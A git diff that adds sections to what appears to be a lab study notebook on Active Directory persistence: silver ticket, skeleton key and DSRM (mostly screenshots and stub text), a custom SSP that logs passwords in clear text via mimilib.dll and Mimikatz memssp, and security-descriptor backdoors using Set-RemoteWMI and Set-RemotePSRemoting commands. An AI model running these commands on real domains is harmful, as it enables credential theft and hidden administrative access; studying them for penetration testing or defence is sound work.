@@ -132,5 +132,140 @@ Invoke-Mimikatz -Command '"lsadump:dcsync /user:server1\krbtgt"'
 
 ### Silver Ticket
 
+About silver ticket
+
+![](.gitbook/assets/1%20%281%29.png)
+
+![](.gitbook/assets/1a.png)
+
+![](.gitbook/assets/2-silver-ticket-error.png)
+
+![Tried this and many others, nothing worked](.gitbook/assets/solutin-tried-among-others-didnt-worked.png)
+
+### Skeleton Key
+
+something about skeleton key
+
+![](.gitbook/assets/1.png)
+
+![](.gitbook/assets/2-running-the-same-command-results-in-error.png)
+
+![](.gitbook/assets/3.png)
+
+![](.gitbook/assets/3a.png)
+
+### DSRM
+
+somethign about DSRM
+
+![Dumping dsrm password](.gitbook/assets/1-dumping-dsrm-password.png)
+
+![Comparing the ntlm hash with the previously ](.gitbook/assets/2-comparing-the-administrator-hash-with-the-one-obtained-previously.png)
+
+![Adding the new property to change the logon behaviour so that we can use dsrm hash to login](.gitbook/assets/3-chaning-the-logon-behaviour-before-we-can-use-the-hash-obtained-previously-for-logging-at-a-later-stage.png)
+
+![Observe the changed logon behaviour](.gitbook/assets/4-logon-behavioiur-changed.png)
+
+![Invoke-Mimikatz giving the same error as in Silver ticket](.gitbook/assets/5-to-login-to-the-domain-controller-using-the-previously-obtained-hash-use-this-command.png)
+
+### Custom SSP
+
+Security Support Provider \(SSP\) is a DLL which provides ways for an application to obtain an authenticated connection. Some SSP packages by microsoft are
+
+* NTLM
+* Kerberos
+* Wdigest
+* CredSSP
+
+Mimikatz provides a custom SSP - **mimilib.dll**. This SSP logs local logons, service account and machine account password in clear text on the target server.
+
+Two ways to implement 
+
+Pickup mimilib.dll from mimikatz repository and drop it to the system32 directory and add mimilib to "HKLM\SYSTEM CurrentControlSet\Control\Lsa\Security Packages" 
+
+Sample Code: 
+
+```text
+$packages = Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig -Name 'Security Packages' | select -ExpandProperty 'Security Packages' $packages += "mimilib"
+
+Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages' -Value $packages
+
+Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\ -Name 'Security Packages' -Value $packages
+```
+
+Using mimikatz, inject into lsass \(not stable with Server 2016\):
+
+```text
+Invoke-Mimikatz -Command '"misc::memssp"'
+```
+
+### Persistence Using ACLs - AdminSDHolder & Rights Abusers
+
+// to do
+
+### Persistence Using ACLs - Security Descriptors
+
+It is possible to modify Security Descriptors \(security information like Owner, primary group, DACL and SACL\) of multiple remote access methods \(securable objects\) to allow access to non-admin users. Administrative privileges are required for this.
+
+Security Descriptor Definition Language defines the format which is used to describe a security descriptot. SDDL uses ACE strings for DACL and SACL: ace\_type; ace\_flags; rights; object\_guid; inherit\_object-guid; account\_sid
+
+ACE for build-in admininstrators for WMI namespaces A;Cl;CCDCLCSWRPWPRCWD;;SID
+
+Lets see how this attack is performed. Running the following command with the user not having enough privileges gives the following errors.
+
+```text
+Get-wmiobject -class win32_operatingsystem -ComputerName WIN-670U2C077D3.server1.ad.local
+```
+
+![](.gitbook/assets/image%20%2810%29.png)
+
+To get user persistence with security descriptors, follow the following steps \(assuming admin priviledge is already there\)
+
+![](.gitbook/assets/image%20%2813%29.png)
+
+![](.gitbook/assets/image%20%289%29.png)
+
+![](.gitbook/assets/image%20%2816%29.png)
+
+![](.gitbook/assets/image%20%2811%29.png)
+
+![](.gitbook/assets/image%20%2815%29.png)
+
+![](.gitbook/assets/image%20%2812%29.png)
+
+![](.gitbook/assets/image%20%2814%29.png)
+
+These things can also be performed using scripts using Set-RemoteWMI.ps1. ACLs can be modified to allow non-admin users access to securable objects. To remove the permission added using the script, 
+
+```text
+On local machine for user1:
+Set-RemoteWMI -UserName user1 -Verbose
+
+On remote machine for user1 without explicit credentials:
+Set-RemoteWMI -UserName user1 -ComputerName WIN-670U2C077D3.ad.local -namespace 'root\cimv2' -Verbose
+
+On remote machine with explicit credentials. Only root\cimv2 and nested namespaces:
+Set-RemoteWMI -UserName user1 -ComputerName WIN-670U2C077D3.ad.local -Credential Administrator -namespace 'root\cimv2' -Verbose
+
+On remote machine remove permissions:
+Set-RemoteWMI -UserName user1 -ComputerName WIN-670U2C077D3.ad.local -namespace 'root\cimv2' -Remove -Verbose
+
+```
+
+**Using PowerShell Remoting**
+
+```text
+On local machine for user1:
+Set-RemotePSRemoting -UserName user1 -Verbose
+
+On remote machine for user1 without credentials:
+Set-RemotePSRemoting -UserName user1 -ComputerName WIN-670U2C077D3.ad.local -Verbose
+
+On remote machine, remove permissions:
+Set-RemotePSRemoting -UserName user1 -ComputerName WIN-670U2C077D3.ad.local -Remote
+```
+
+
+
 
 
